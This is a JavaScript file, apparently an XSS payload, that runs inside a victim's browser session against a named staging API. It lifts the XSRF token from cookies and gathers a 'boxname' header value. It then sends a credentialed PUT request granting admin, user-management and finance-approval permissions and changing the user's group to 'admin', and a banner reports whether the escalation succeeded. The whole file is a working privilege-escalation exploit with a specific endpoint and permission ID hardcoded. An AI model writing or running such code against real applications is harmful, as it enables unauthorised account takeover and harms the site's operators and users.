// e.js - Exact API Replication with Boxname & Privilege Escalation

(function() {
    if (window.__xss_perm_done) return;
    window.__xss_perm_done = true;

    // ============================================
    // 1. HELPER: Get Cookie Value
    // ============================================
    function getCookie(name) {
        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
        return match ? decodeURIComponent(match[2]) : null;
    }

    // ============================================
    // 2. GET CSRF TOKEN (from document.cookie)
    // ============================================
    const xsrfToken = getCookie('__Secure-XSRF_TOKEN') || getCookie('Secure-XSRF_TOKEN');
    if (!xsrfToken) {
        showMessage('❌ XSRF token not found!', 'red');
        return;
    }

    // ============================================
    // 3. GET BOXNAME (from page or hardcoded)
    // ============================================
    function getBoxname() {
        // Try to find Boxname in meta tags
        const meta = document.querySelector('meta[name="boxname"]');
        if (meta && meta.content) return meta.content;

        // Try to find in script variables (common pattern)
        if (window.boxname) return window.boxname;
        if (window.BOXNAME) return window.BOXNAME;
        if (window.Boxname) return window.Boxname;

        // Try to find in hidden input fields
        const input = document.querySelector('input[name="boxname"], [data-boxname]');
        if (input && input.value) return input.value;

        // Try to extract from the URL (sometimes part of the path)
        const pathMatch = window.location.pathname.match(/\/box\/([a-zA-Z0-9_-]+)/i);
        if (pathMatch) return pathMatch[1];

        // Fallback to your hardcoded Boxname from the request
        return 'mHdNIKa_pCDJSlM--eOlDx9nLfbZuGTSh--Rg775PgutBpGW7t_FVqU9Q';
    }

    const boxname = getBoxname();
    console.log('Boxname used:', boxname);

    // ============================================
    // 4. CONFIGURATION
    // ============================================
    const API_URL = 'https://basilstagingapi.coraltreetech.com/api/v1/user_permissions/update_permission_json';
    
    // Permission ID from your request (can be changed)
    const PERMISSION_ID = 'c003c9ef-19a5-42f1-9f7f-27b4de450d3b';

    // ============================================
    // 5. BUILD THE MALICIOUS PAYLOAD
    //    - Grant extra permissions (not just forms_view)
    //    - Escalate user_group from "team" to "admin"
    // ============================================
    const payload = {
        user_permission: {
            [PERMISSION_ID]: {
                "forms_view": true,
                "admin_panel": true,      // Try to add admin access
                "user_management": true,  // Try to add user management
                "finance_approve": true,  // Try to add finance permissions
                "settings_edit": true     // Try to add settings edit
            }
        },
        user_group: "admin",   // <-- Escalation!
        is_consultant: false
    };

    // ============================================
    // 6. SEND THE REQUEST (EXACT HEADERS)
    // ============================================
    fetch(API_URL, {
        method: 'PUT',
        credentials: 'include',   // Crucial: sends HttpOnly session cookie
        headers: {
            'Content-Type': 'application/json',
            'X-Xsrf-Token': xsrfToken,        // Exact header from your request
            'Boxname': boxname,               // Exact header from your request
            'Contextuser': '',                // Exact header (empty)
            'Accept': 'application/json',
            'Sec-Gpc': '1',                   // Optional but matches your request
            'Sec-Fetch-Site': 'same-site',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty'
        },
        body: JSON.stringify(payload)
    })
    .then(response => {
        // Read response body (even if empty)
        return response.text().then(text => ({
            status: response.status,
            statusText: response.statusText,
            body: text || '(empty response)'
        }));
    })
    .then(result => {
        if (result.status === 200 || result.status === 204) {
            showMessage(
                '✅ PRIVILEGE ESCALATION SUCCESSFUL!\n\n' +
                'Status: ' + result.status + ' ' + result.statusText + '\n' +
                'User group changed to: ADMIN\n' +
                'Permissions granted: forms_view, admin_panel, user_management\n' +
                'Check the permissions page to verify!',
                'green'
            );
            console.log('✅ SUCCESS Response:', result.body);
        } else {
            showMessage(
                '❌ Update failed.\n\n' +
                'Status: ' + result.status + ' ' + result.statusText + '\n' +
                'Body: ' + (result.body ? result.body.substring(0, 200) : '(empty)') + '\n\n' +
                'Check DevTools Console for full details.',
                'red'
            );
            console.error('❌ FAIL Response:', result.body);
        }
    })
    .catch(error => {
        // If CORS or network error occurs
        showMessage(
            '❌ Request BLOCKED (CORS/Network).\n\n' +
            'Error: ' + error.message + '\n\n' +
            'Check DevTools Console for details.',
            'red'
        );
        console.error('Fetch Error:', error);
    });

    // ============================================
    // 7. HELPER: Display Floating Message
    // ============================================
    function showMessage(text, color) {
        const div = document.createElement('div');
        div.style.cssText = `
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: ${color === 'green' ? '#28a745' : '#dc3545'};
            color: white;
            padding: 25px 40px;
            z-index: 9999999;
            font-size: 17px;
            font-weight: bold;
            border-radius: 12px;
            box-shadow: 0 6px 30px rgba(0,0,0,0.6);
            border: 3px solid white;
            text-align: center;
            max-width: 90%;
            white-space: pre-wrap;
            font-family: 'Segoe UI', Arial, sans-serif;
            line-height: 1.6;
            pointer-events: none;
        `;
        div.textContent = text;
        document.body.appendChild(div);

        // Auto-remove after 20 seconds
        setTimeout(() => {
            if (div.parentNode) div.remove();
        }, 20000);
    }

})();
